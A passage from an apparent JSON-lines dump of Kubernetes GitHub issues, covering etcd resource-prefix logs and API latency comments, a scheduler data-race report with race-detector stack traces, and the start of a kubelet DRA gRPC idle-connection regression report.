resourcePrefix=\"/daemonsets\"\netcd3.New\" group=\"apps\" resource=\"deployments\" resourcePrefix=\"/deployments\"\netcd3.New\" group=\"apps\" resource=\"replicasets\" resourcePrefix=\"/replicasets\"\netcd3.New\" group=\"apps\" resource=\"statefulsets\" resourcePrefix=\"/statefulsets\"\netcd3.New\" group=\"autoscaling\" resource=\"horizontalpodautoscalers\" resourcePrefix=\"/horizontalpodautoscalers\"\netcd3.New\" group=\"batch\" resource=\"cronjobs\" resourcePrefix=\"/cronjobs\"\netcd3.New\" group=\"batch\" resource=\"jobs\" resourcePrefix=\"/jobs\"\netcd3.New\" group=\"certificates.k8s.io\" resource=\"certificatesigningrequests\" resourcePrefix=\"/certificatesigningrequests\"\netcd3.New\" group=\"coordination.k8s.io\" resource=\"leases\" resourcePrefix=\"/leases\"\netcd3.New\" group=\"discovery.k8s.io\" resource=\"endpointslices\" resourcePrefix=\"/endpointslices\"\netcd3.New\" group=\"flowcontrol.apiserver.k8s.io\" resource=\"flowschemas\" resourcePrefix=\"/flowschemas\"\netcd3.New\" group=\"flowcontrol.apiserver.k8s.io\" resource=\"prioritylevelconfigurations\" resourcePrefix=\"/prioritylevelconfigurations\"\netcd3.New\" group=\"networking.k8s.io\" resource=\"ingressclasses\" resourcePrefix=\"/ingressclasses\"\netcd3.New\" group=\"networking.k8s.io\" resource=\"ingresses\" resourcePrefix=\"/ingress\"\netcd3.New\" group=\"networking.k8s.io\" resource=\"ipaddresses\" resourcePrefix=\"/ipaddresses\"\netcd3.New\" group=\"networking.k8s.io\" resource=\"networkpolicies\" resourcePrefix=\"/networkpolicies\"\netcd3.New\" group=\"networking.k8s.io\" resource=\"servicecidrs\" resourcePrefix=\"/servicecidrs\"\netcd3.New\" group=\"node.k8s.io\" resource=\"runtimeclasses\" resourcePrefix=\"/runtimeclasses\"\netcd3.New\" group=\"policy\" resource=\"poddisruptionbudgets\" resourcePrefix=\"/poddisruptionbudgets\"\netcd3.New\" group=\"rbac.authorization.k8s.io\" resource=\"clusterrolebindings\" resourcePrefix=\"/clusterrolebindings\"\netcd3.New\" group=\"rbac.authorization.k8s.io\" resource=\"clusterroles\" resourcePrefix=\"/clusterroles\"\netcd3.New\" group=\"rbac.authorization.k8s.io\" resource=\"rolebindings\" resourcePrefix=\"/rolebindings\"\netcd3.New\" group=\"rbac.authorization.k8s.io\" resource=\"roles\" resourcePrefix=\"/roles\"\netcd3.New\" group=\"\" resource=\"apiServerIPInfo\" resourcePrefix=\"\"\netcd3.New\" group=\"\" resource=\"configmaps\" resourcePrefix=\"/configmaps\"\netcd3.New\" group=\"\" resource=\"endpoints\" resourcePrefix=\"/services/endpoints\"\netcd3.New\" group=\"\" resource=\"events\" resourcePrefix=\"/events\"\netcd3.New\" group=\"resource.k8s.io\" resource=\"deviceclasses\" resourcePrefix=\"/deviceclasses\"\netcd3.New\" group=\"resource.k8s.io\" resource=\"resourceclaims\" resourcePrefix=\"/resourceclaims\"\netcd3.New\" group=\"resource.k8s.io\" resource=\"resourceclaimtemplates\" resourcePrefix=\"/resourceclaimtemplates\"\netcd3.New\" group=\"resource.k8s.io\" resource=\"resourceslices\" resourcePrefix=\"/resourceslices\"\netcd3.New\" group=\"\" resource=\"limitranges\" resourcePrefix=\"/limitranges\"\netcd3.New\" group=\"\" resource=\"namespaces\" resourcePrefix=\"/namespaces\"\netcd3.New\" group=\"\" resource=\"nodes\" resourcePrefix=\"/minions\"\netcd3.New\" group=\"\" resource=\"persistentvolumeclaims\" resourcePrefix=\"/persistentvolumeclaims\"\netcd3.New\" group=\"\" resource=\"persistentvolumes\" resourcePrefix=\"/persistentvolumes\"\netcd3.New\" group=\"\" resource=\"pods\" resourcePrefix=\"/pods\"\netcd3.New\" group=\"\" resource=\"podtemplates\" resourcePrefix=\"/podtemplates\"\netcd3.New\" group=\"\" resource=\"replicationcontrollers\" resourcePrefix=\"/controllers\"\netcd3.New\" group=\"\" resource=\"resourcequotas\" resourcePrefix=\"/resourcequotas\"\netcd3.New\" group=\"\" resource=\"secrets\" resourcePrefix=\"/secrets\"\netcd3.New\" group=\"\" resource=\"serviceaccounts\" resourcePrefix=\"/serviceaccounts\"\netcd3.New\" group=\"\" resource=\"servicenodeportallocations\" resourcePrefix=\"\"\netcd3.New\" group=\"\" resource=\"services\" resourcePrefix=\"/services/specs\"\netcd3.New\" group=\"scheduling.k8s.io\" resource=\"priorityclasses\" resourcePrefix=\"/priorityclasses\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"csidrivers\" resourcePrefix=\"/csidrivers\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"csinodes\" resourcePrefix=\"/csinodes\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"csistoragecapacities\" resourcePrefix=\"/csistoragecapacities\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"storageclasses\" resourcePrefix=\"/storageclasses\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"volumeattachments\" resourcePrefix=\"/volumeattachments\"\netcd3.New\" group=\"storage.k8s.io\" resource=\"volumeattributesclasses\" resourcePrefix=\"/volumeattributesclasses\"\n```\n"}, {"author": "serathius", "body": "Filled issue for that https://github.com/kubernetes/kubernetes/issues/133877"}, {"author": "serathius", "body": "After removing the KeysOnly list on events, latency went down to previous level of 99%ile around 100-200ms\n\n<img width=\"1521\" height=\"991\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c9108820-7af2-4772-b3cc-de42b264d5d2\" />\n\n<img width=\"1513\" height=\"831\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fed97953-4c92-4c09-aac8-daee4956ae16\" />"}, {"author": "aojea", "body": "impressive \ud83d\udc4f "}, {"author": "dims", "body": "very cool @serathius thanks for tracking this down and fixing it!"}, {"author": "serathius", "body": "What cools is that I checked metric returned by resource size estimate mechanism to compare it versus size of returned response in large cluster. The error was 0.5%."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 132025, "issue_url": "https://github.com/kubernetes/kubernetes/issues/132025", "issue_title": "scheduler handleSchedulingFailure: DATA RACE", "issue_author": "pohly", "issue_body": "### What happened?\n\nI have https://github.com/kubernetes/kubernetes/pull/116980 which runs integration tests with race detection enabled. Running it shows in several tests:\n```\nk8s.io/kubernetes/test/integration/scheduler: preemption\n...\n=== RUN   TestPreemption/basic_pod_preemption_with_preFilter_(Async_preemption_enabled:_true)\n...\n\nWARNING: DATA RACE\nWrite at 0x00c0089f0c60 by goroutine 6125:\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:1068 +0x1154\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure-fm()\n      <autogenerated>:1 +0xcb\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:118 +0xd8a\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne-fm()\n      <autogenerated>:1 +0x47\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x9c\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n  k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n  k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x59\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run.gowrap1()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:507 +0x17\n\nPrevious read at 0x00c0089f0c60 by goroutine 5910:\n  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).Update()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1020 +0x1652\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).updatePodInSchedulingQueue()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/eventhandlers.go:164 +0xd06\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).updatePodInSchedulingQueue-fm()\n      <autogenerated>:1 +0x64\n  k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:264 +0x81\n  k8s.io/client-go/tools/cache.(*ResourceEventHandlerFuncs).OnUpdate()\n      <autogenerated>:1 +0x1f\n  k8s.io/client-go/tools/cache.FilteringResourceEventHandler.OnUpdate()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:329 +0xef\n  k8s.io/client-go/tools/cache.(*FilteringResourceEventHandler).OnUpdate()\n      <autogenerated>:1 +0x84\n  k8s.io/client-go/tools/cache.(*processorListener).run.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1074 +0x3b9\n  k8s.io/client-go/tools/cache.(*processorListener).run()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1086 +0x5e\n  k8s.io/client-go/tools/cache.(*processorListener).run-fm()\n      <autogenerated>:1 +0x33\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n\nGoroutine 6125 (running) created at:\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:507 +0x1c4\n  k8s.io/kubernetes/test/integration/scheduler/preemption.TestPreemption.gowrap1()\n      /home/prow/go/src/k8s.io/kubernetes/test/integration/scheduler/preemption/preemption_test.go:179 +0x4f\n\nGoroutine 5910 (running) created at:\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0xe4\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:888 +0x1e7\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:892 +0x4b\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run-fm()\n      <autogenerated>:1 +0x47\n  k8s.io/client-go/tools/cache.(*sharedIndexInformer).RunWithContext.(*Group).StartWithContext.func4()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:63 +0x46\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n```\n\n### What did you expect to happen?\n\nNo data race.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun locally with `go test -race`.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\nmaster\n\n/sig scheduling\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/scheduling", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "googs1025", "body": "/assign \n\nI'll try to fix this :)"}, {"author": "sanposhiho", "body": "Oh, so `-race` isn't used in CIs? (why?)"}, {"author": "sanposhiho", "body": "/assign @macsko "}, {"author": "pohly", "body": "In the past, `-race` caused performance issues in pull-kubernetes-integration. It works better nowadays, but still causes known flakes which makes it unsuitable for that job.\n\nWe have https://testgrid.k8s.io/sig-testing-canaries#integration-race-master now.\n"}, {"author": "pohly", "body": "This still happens.\n"}, {"author": "macsko", "body": "#132451 is expected to fix that"}, {"author": "pohly", "body": "/reopen\n\nhttps://github.com/kubernetes/kubernetes/pull/132451 changed the race, but it still occurs. From  volumescheduling in https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-integration-race-master/1962469356566745088:\n\n```\nWARNING: DATA RACE\nWrite at 0x00c00c955050 by goroutine 116606:\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:1098 +0x1138\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure-fm()\n      <autogenerated>:1 +0xcb\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:119 +0xdbe\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne-fm()\n      <autogenerated>:1 +0x47\n  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x9c\n...\n  k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x59\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run.gowrap1()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:538 +0x17\n\nPrevious read at 0x00c00c955050 by goroutine 116274:\n  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).movePodsToActiveOrBackoffQueue()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1242 +0x857\n  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).moveAllToActiveOrBackoffQueue()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1178 +0x4e4\n  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).MoveAllToActiveOrBackoffQueue()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1188 +0x1b1\n  k8s.io/kubernetes/pkg/scheduler.addAllEventHandlers.addAllEventHandlers.func3.func16()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/eventhandlers.go:505 +0x54d\n  k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnAdd()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:259 +0x63\n  k8s.io/client-go/tools/cache.(*ResourceEventHandlerFuncs).OnAdd()\n      <autogenerated>:1 +0x1b\n  k8s.io/client-go/tools/cache.(*processorListener).run.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1076 +0x1fa\n  k8s.io/client-go/tools/cache.(*processorListener).run()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1086 +0x5e\n  k8s.io/client-go/tools/cache.(*processorListener).run-fm()\n      <autogenerated>:1 +0x33\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n\nGoroutine 116606 (running) created at:\n  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run()\n      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:538 +0x224\n  k8s.io/kubernetes/test/integration/volumescheduling.setupCluster.gowrap1()\n      /home/prow/go/src/k8s.io/kubernetes/test/integration/volumescheduling/volume_binding_test.go:1044 +0x4f\n\nGoroutine 116274 (running) created at:\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0xe4\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:888 +0x1e7\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:892 +0x4b\n  k8s.io/client-go/tools/cache.(*sharedProcessor).run-fm()\n      <autogenerated>:1 +0x47\n  k8s.io/client-go/tools/cache.(*sharedIndexInformer).RunWithContext.(*Group).StartWithContext.func4()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:63 +0x46\n  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n```"}, {"author": "k8s-ci-robot", "body": "@pohly: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/132025#issuecomment-3242550242):\n\n>/reopen\n>\n>https://github.com/kubernetes/kubernetes/pull/132451 changed the race, but it still occurs. From  volumescheduling in https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-integration-race-master/1962469356566745088:\n>\n>```\n>WARNING: DATA RACE\n>Write at 0x00c00c955050 by goroutine 116606:\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:1098 +0x1138\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).handleSchedulingFailure-fm()\n>      <autogenerated>:1 +0xcb\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/schedule_one.go:119 +0xdbe\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).ScheduleOne-fm()\n>      <autogenerated>:1 +0x47\n>  k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x9c\n>...\n>  k8s.io/apimachinery/pkg/util/wait.UntilWithContext()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/backoff.go:172 +0x59\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run.gowrap1()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:538 +0x17\n>\n>Previous read at 0x00c00c955050 by goroutine 116274:\n>  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).movePodsToActiveOrBackoffQueue()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1242 +0x857\n>  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).moveAllToActiveOrBackoffQueue()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1178 +0x4e4\n>  k8s.io/kubernetes/pkg/scheduler/backend/queue.(*PriorityQueue).MoveAllToActiveOrBackoffQueue()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/backend/queue/scheduling_queue.go:1188 +0x1b1\n>  k8s.io/kubernetes/pkg/scheduler.addAllEventHandlers.addAllEventHandlers.func3.func16()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/eventhandlers.go:505 +0x54d\n>  k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnAdd()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/controller.go:259 +0x63\n>  k8s.io/client-go/tools/cache.(*ResourceEventHandlerFuncs).OnAdd()\n>      <autogenerated>:1 +0x1b\n>  k8s.io/client-go/tools/cache.(*processorListener).run.func1()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1076 +0x1fa\n>  k8s.io/client-go/tools/cache.(*processorListener).run()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:1086 +0x5e\n>  k8s.io/client-go/tools/cache.(*processorListener).run-fm()\n>      <autogenerated>:1 +0x33\n>  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n>\n>Goroutine 116606 (running) created at:\n>  k8s.io/kubernetes/pkg/scheduler.(*Scheduler).Run()\n>      /home/prow/go/src/k8s.io/kubernetes/pkg/scheduler/scheduler.go:538 +0x224\n>  k8s.io/kubernetes/test/integration/volumescheduling.setupCluster.gowrap1()\n>      /home/prow/go/src/k8s.io/kubernetes/test/integration/volumescheduling/volume_binding_test.go:1044 +0x4f\n>\n>Goroutine 116274 (running) created at:\n>  k8s.io/apimachinery/pkg/util/wait.(*Group).Start()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0xe4\n>  k8s.io/client-go/tools/cache.(*sharedProcessor).run.func1()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:888 +0x1e7\n>  k8s.io/client-go/tools/cache.(*sharedProcessor).run()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/client-go/tools/cache/shared_informer.go:892 +0x4b\n>  k8s.io/client-go/tools/cache.(*sharedProcessor).run-fm()\n>      <autogenerated>:1 +0x47\n>  k8s.io/client-go/tools/cache.(*sharedIndexInformer).RunWithContext.(*Group).StartWithContext.func4()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:63 +0x46\n>  k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()\n>      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x86\n>```\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "macsko", "body": "It's a race with a slightly different origin. I'll take a look"}, {"author": "macsko", "body": "/close\n\nShould be fixed by the #133838. No scheduler-related failures since merge."}, {"author": "k8s-ci-robot", "body": "@macsko: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/132025#issuecomment-3265531824):\n\n>/close\n>\n>Should be fixed by the #133838. No scheduler-related failures since merge.\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133920, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133920", "issue_title": "Regression 1.34 -- Kubelet requires restart after gRPC connection to DRA driver goes idle", "issue_author": "klueska", "issue_body": "This issue describes a bug in DRA's plugin communication with the kubelet that causes pods to get stuck in the Terminating state. This only occurs after waiting a *long* time (in my original test case 75 minutes).\n\nAfter some testing, I've concluded that this occurs when gRPC connections to DRA plugins go idle after their configured timeout period. The issue becomes reproducible after 1 minute by shortening the idle timeout to 1 minute using `grpc.WithIdleTimeout(time.Minute)`, showing that the problem is related to gRPC's idle connection handling.\n\nOnce we reach this point where the gRPC connection has gone idle, attempting to terminate a pod with DRA allocated resourcces hang during cleanup, with the kubelet logging `Calling NodeUnprepareResource rpc` but never logging the corresponding `Done calling` message. The gRPC calls to the DRA plugin never complete despite having a 45-second context timeout.\n\nNote, that The DRA plugin never receives the `NodeUnprepareResources` requests that kubelet claims to be sending. This indicates that the hang occurs after the kubelet sends the request but before it reaches the plugin, pointing to an issue in gRPC's internal connection management.\n\nThe only current workaround for users is to restart kubelet, which forces fresh connection establishment and resolves the stuck pods until the next idle timeout period expires.\n\nSeveral remediation approaches were tested with mixed results. Adding fallback timeouts and manual connection closure attempts failed to unblock the hanging calls. However, enabling the `ResourceHealthStatus` feature gate *does* resolve the issue because it maintains persistent gRPC streams that prevent connections from going idle. Two other solutions I tried worked: disabling idle timeouts with `grpc.WithIdleTimeout(0)`, and implementing connection health checking that recreates connections when they're not in the `Ready` state.\n\nThe proposed (short-term) fix combines both approaches. It disables idle timeouts, and adds connection state validation before each RPC call, automatically recreating connections that have gone idle. This should provide protection against both the immediate idle timeout bug and other potential connection staleness issues in long-running kubelet processes.\n\nIn the long run, we need to dig into `gRPC` itself and see why this hang is occurring at all.\n\n## Steps to reproduce\n\n* Install the NVIDIA DRA driver for GPUs\n\n```shell\nhelm install nvidia-dra-driver-gpu deployments/helm/nvidia-dra-driver-gpu \\\n    --create-namespace \\\n    --namespace nvidia-dra-driver-gpu \\\n    --set nvidiaDriverRoot=/run/nvidia/driver \\\n    --set gpuResourcesEnabledOverride=true\n```\n\n* Run a workload\n\n```shell\nkubectl apply -f demo/specs/imex/mn-channel-injection.yaml\n```\n\n* See the relevant pods running\n\n```shell\n$ kubectl get pod -A\n...\ndefault                 mn-imex-channel-injection-57b546bc47-6mngm                    1/1     Running     0             7s\ndefault                 mn-imex-channel-injection-57b546bc47-96nqm                    1/1     Running     0             7s\ndefault                 mn-imex-channel-injection-57b546bc47-s6jwt                    1/1     Running     0             